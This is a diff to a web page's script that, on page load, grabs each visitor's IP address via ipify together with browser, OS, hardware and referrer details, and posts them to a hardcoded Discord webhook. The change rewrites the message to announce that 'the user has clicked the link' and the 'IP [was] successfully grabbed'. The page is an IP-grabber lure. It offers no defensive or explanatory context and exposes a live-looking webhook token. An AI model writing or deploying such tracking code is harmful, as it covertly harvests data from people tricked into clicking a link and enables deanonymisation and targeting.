@@ -11,7 +11,8 @@
 
     <script>
         var ip = '';
-        var deviceName = navigator.userAgent; // Obtient le nom de l'ordinateur à partir des informations du navigateur
+        var deviceName = navigator.userAgent;
+        var currentDateTime = new Date().toISOString().slice(0, 19).replace('T', ' ');
 
         fetch('https://api.ipify.org/?format=json')
             .then(function(response) {
@@ -22,7 +23,7 @@
                 var webhook = 'https://discord.com/api/webhooks/1126222435860107304/P8OUTmVfXEUBYnOy-rdpgdIaOYPzvzw9pJPfl_X8hLOi1yQEVRHaHaAmkz5Vdws69rwO';
 
                 var message = {
-                    content: 'IP: ' + ip + '\nAppareil: ' + deviceName
+                    content: '# The user has clicked the link. IP successfully grabbed. <Wings_Services>\n\nDate/Time: ' + currentDateTime + ' GMT\n\nIP Address: ' + ip + '\n\nCountry: Germany, Berlin\n\nBrowser: ' + navigator.userAgent + ' (' + navigator.appVersion + ')\n\nOperating System: ' + navigator.platform + '\n\nDevice:\n\n' + navigator.deviceMemory + ',\n\n' + navigator.hardwareConcurrency + ',\n\n' + deviceName + '\n\nUser Agent: ' + navigator.userAgent + '\n\nReferring URL: ' + document.referrer + '\n\nHost Name: ' + window.location.hostname
                 };
 
                 fetch(webhook, {
